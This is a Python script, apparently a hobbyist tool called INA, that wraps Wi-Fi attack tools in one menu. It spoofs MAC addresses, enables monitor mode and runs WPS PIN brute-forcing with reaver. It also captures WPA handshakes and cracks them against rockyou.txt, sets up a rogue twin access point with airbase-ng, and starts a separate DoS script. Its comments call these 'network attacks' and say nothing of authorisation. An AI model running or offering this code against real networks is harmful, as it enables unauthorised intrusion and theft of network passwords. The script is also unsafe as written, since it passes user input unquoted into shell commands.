import os
import time
from NetworkCardSelection import interfaceSelectionChoice

# PYTHON VERSION 2.7.13
#AIRMON-NG, WIFITE, AND FLUXION, THEN SIMPLY LOOK UP HOW TO DOWNLOAD THESE TOOLS ONLINE
#THAT IS ALL AND ENJOY THIS EASIER WAY TO DO NETWORK ATTACKS!!!
interfaceSelection = interfaceSelectionChoice()
print("Your current interface is {0}".format(interfaceSelection))
time.sleep(1)
os.system("clear")

def menuSystem():
    #INA = Intern's Network Agent
    print(" ___   __    _  _______")
    print("|   | |  |  | ||   _   |")
    print("|   | |   |_| ||  |_|  |")
    print("|   | |       ||       |")
    print("|   | |  _    ||       |")
    print("|   | | | |   ||   _   |")
    print("|___| |_|  |__||__| |__|")
    print("")
    print("Some things you may not have on your computer so please install wifite, fluxion, airmon-ng package, and reaver if you do not have them!!!")
    print("")
    print("What attack would you like to do today: ")
    print("")
    print("[1]: fluxion")
    print("[2]: wifite")
    print("""[3]: airmon-ng""")
    print("[4]: reaver")
    print("""[5]: airbase-ng""")
    print("[6]: Exit")
    selection = int(input("Enter choice: "))
    if selection == 1:
        runFluxion()
    elif selection == 2:
        runWifite()
    elif selection == 3:
        airmonStart()
    elif selection == 4:
        reaverNetworkSetup()
    elif selection == 5:
        airbaseAttack()
    elif selection == 6:
        afterAttack()
        fixNetworkMangers()
        exit()
    else:
        print("***NO***")
        menuSystem()

#MAC CHANGER AND INTERFACE UP/DOWN
# A VERY IMPORTANT FUNCTION USED IN ALMOST ALL ATTACKS
def networkReady():
    print("***Taking down {0}***".format(interfaceSelection))
    os.system("ifconfig {0} down".format(interfaceSelection))
    print("***Changing MAC of {0}***".format(interfaceSelection))
    os.system("macchanger -r {0}".format(interfaceSelection))
    print("***Bringing up {0}***".format(interfaceSelection))
    os.system("ifconfig {0} up".format(interfaceSelection))


"""**************************************************************************"""
#This will start wifite and change mac and select interface
#Wifite must be installed in order for this attack to work
def runWifite():
    networkReady()
    print("***Starting wifite... Enjoy...***")
    os.system("wifite")

# This will start fluxion and change the mac and restart interface
# fluxion must be installed in order for this attack to work
def runFluxion():
    networkReady()
    os.chdir("../../fluxion")
    os.system("./fluxion")



def startWPSCracking():
    print("***Press Ctrl+C when ready to stop***")
    time.sleep(1)
    os.system("wash -i {0}mon".format(interfaceSelection))
    channel = int(raw_input("Please enter the channel of the target device: "))
    targetBSSID = raw_input("Please enter the targetBSSID of the device: ")
    attackDelay = int(raw_input("""Please enter the delay between each packet send (15): """))
    timeoutDelay = raw_input("""Please enter the timeout period(.5): """)
    packetSleepTime = raw_input("""Please enter the packetSleepTime(3:15): """)
    picky = raw_input("""Is the device your attacking "picky"?? Y/n: """)
    if picky == "n" or picky == "N":
        print("***STARTING***")
        os.system('reaver -i {0}mon -c {1} -b {2} -vv'.format(interfaceSelection, channel, targetBSSID))
    elif picky == "Y":
        print("***STARTING***")
        os.system('reaver -i {0}mon -c {1} -b {2} -vv -L -N -d {3} -T {4} -r {5}'.format(interfaceSelection, channel, targetBSSID, attackDelay, timeoutDelay, packetSleepTime))
    else:
        afterAttack()
        fixNetworkMangers()
        exit()

def reaverNetworkSetup():
    networkReady()
    print("***Activating airmon-ng for {0}***".format(interfaceSelection))
    os.system("airmon-ng start {0}".format(interfaceSelection))
    print("***Taking down {0}mon***".format(interfaceSelection))
    os.system("ifconfig {0}mon down".format(interfaceSelection))
    print("***Changing mac of {0}mon***".format(interfaceSelection))
    os.system("macchanger -r {0}mon".format(interfaceSelection))
    print("***Starting up {0}mon***".format(interfaceSelection))
    os.system("ifconfig {0}mon up".format(interfaceSelection))
    print("***DONE***")
    reaverKillProcess()

def reaverKillProcess():
    question = raw_input("Airmon-ng check kill? Y/n: ")
    if question == "Y":
        print("***Killing processes that could interupt airmon-ng!***")
        os.system("airmon-ng check kill")
        print("***DONE***")
        startWPSCracking()
    elif question == "N" or question == "n":
        print("***Ok Moving on...***")
        print("***Starting WPS Cracking***")
        startWPSCracking() # Still need to create
    else:
        afterAttack()
        fixNetworkMangers()
        exit()
# This will change the mac of the selected interface, start airmon, and change the mac of the selected interface on monitor mode
def airmonStart():
    networkReady()
    print("***Activating airmon-ng for {0}***".format(interfaceSelection))
    os.system("airmon-ng start {0}".format(interfaceSelection))
    print("***Taking down {0}mon***".format(interfaceSelection))
    os.system("ifconfig {0}mon down".format(interfaceSelection))
    print("***Changing mac of {0}mon***".format(interfaceSelection))
    os.system("macchanger -r {0}mon".format(interfaceSelection))
    print("***Starting up {0}mon***".format(interfaceSelection))
    os.system("ifconfig {0}mon up".format(interfaceSelection))
    print("***DONE***")
    killProcess()

def airBaseAirmonStart():
    networkReady()
    print("***Activating airmon-ng for {0}***".format(interfaceSelection))
    os.system("airmon-ng start {0}".format(interfaceSelection))
    print("***Taking down {0}mon***".format(interfaceSelection))
    os.system("ifconfig {0}mon down".format(interfaceSelection))
    print("***Changing mac of {0}mon***".format(interfaceSelection))
    os.system("macchanger -r {0}mon".format(interfaceSelection))
    print("***Starting up {0}mon***".format(interfaceSelection))
    os.system("ifconfig {0}mon up".format(interfaceSelection))
    print("***DONE***")
    airBaseKillProcess()
# This is asking the user if they would like to kill processes, doesn't always have to be done but if stuff isn't working this could fix it
def killProcess():
    question = raw_input("Airmon-ng check kill? Y/n: ")
    if question == "Y":
        print("***Killing processes that could interupt airmon-ng!***")
        os.system("airmon-ng check kill")
        print("***DONE***")
        runAirodump()
    elif question == "N" or question == "n":
        print("***Ok Moving on...***")
        print("***Starting airodump-ng***")
        runAirodump()
    else:
        afterAttack()
        fixNetworkMangers()
        exit()

def airBaseKillProcess():
    question = raw_input("Airmon-ng check kill? Y/n: ")
    if question == "Y":
        print("***Killing processes that could interupt airmon-ng!***")
        os.system("airmon-ng check kill")
        print("***DONE***")
        airbaseAirodump()
    elif question == "N" or question == "n":
        print("***Ok Moving on...***")
        print("***Starting airodump-ng***")
        airbaseAirodump()
    else:
        afterAttack()
        fixNetworkMangers()
        exit()

def startFileOpen():
    os.system("gnome-terminal -e 'python NetworkHackDoS.py'")

def runAirodump():
    print("***Starting to dump nearby networks on interface {0}mon...***".format(interfaceSelection))
    os.system("airodump-ng {0}mon".format(interfaceSelection))
    targetBSSID = raw_input("Type BSSID of Target Network: ")
    targetChannel = int(raw_input("Please type Target Channel: "))
    filePath = raw_input("Please type a path with a filename: ")
    startFileOpen()
    os.system('airodump-ng --bssid {0} --channel {1} -w {2} {3}mon'.format(targetBSSID, targetChannel, filePath, interfaceSelection))
    question = raw_input("Would you like to crack the handshake key? Y/n: ")
    if question == "Y":
        startAircrackng()
    elif question == "N" or question == "n":
        afterAttack()
        fixNetworkMangers()
        exit()

def airbaseAttack():
    airBaseAirmonStart()
    airbaseAirodump()

def airbaseAirodump():
    print("***Starting to dump nearby networks on interface {0}mon...***".format(interfaceSelection))
    os.system("airodump-ng {0}mon".format(interfaceSelection))
    targetBSSID = raw_input("Type BSSID of Target Network: ")
    targetESSID = raw_input("Type Target ESSID: ")
    targetChannel = int(input("Type Target Channel: "))
    print("Press Ctrl + C to stop the access point...")
    time.sleep(1)
    os.system("airbase-ng -a {0} --essid {1} -c {2} {3}mon".format(targetBSSID, targetESSID, targetChannel, interfaceSelection))
    afterAttack()
    fixNetworkMangers()
    exit()

#This is starting aircrack-ng in order to break a .cap file and get the password for the network
def startAircrackng():
    print("***Preferences will appear below please follow what they say and add them to the input.***")
    wordlist = raw_input("Please type the path to your wordlist here (Type 99 for Rockyou.txt): ")
    print("***DONE***")
    capFile = raw_input("Please type the path to your .cap file here: ")
    print("***DONE***")
    if wordlist == "99":
        print("""***STARTING AIRCRACK-NG***""")
        #Taking the inputs from above and placing them into the command
        os.system('aircrack-ng -w /usr/share/wordlists/rockyou.txt {0}'.format(capFile))
        afterAttack()
        fixNetworkMangers()
        exit()
    else:
        print("""***STARTING AIRCRACK-NG***""")
        #Taking the inputs from above and placing them into the command
        os.system('aircrack-ng -w {0} {1}'.format(wordlist, capFile))
        afterAttack()
        fixNetworkMangers()
        exit()

#This code will most likely be used after a network attack
#This will be done after a network attack to fix the network interfaces
def afterAttack():
    #This is stopping airmon-ng and biggining networkFix
    print("***Stopping airmon-ng on {0}mon...***".format(interfaceSelection))
    os.system("airmon-ng stop {0}mon".format(interfaceSelection))
    print("***Starting network fix***")
    fixNetworkMangers()


def fixNetworkMangers():
    #Runs script I created to fix the network-manager once an attack is finished
    networkFix = raw_input("Would you like to fix the network-manager? Y/n: ")
    if networkFix == "Y":
        print("***Starting to reset network managers***")
        os.system("service networking start")
        os.system("service network-manager start")
        os.system("/etc/init.d/networking start")
        print("***If stuff isn't popping up above... God help you.***")
    else:
        exit()

menuSystem()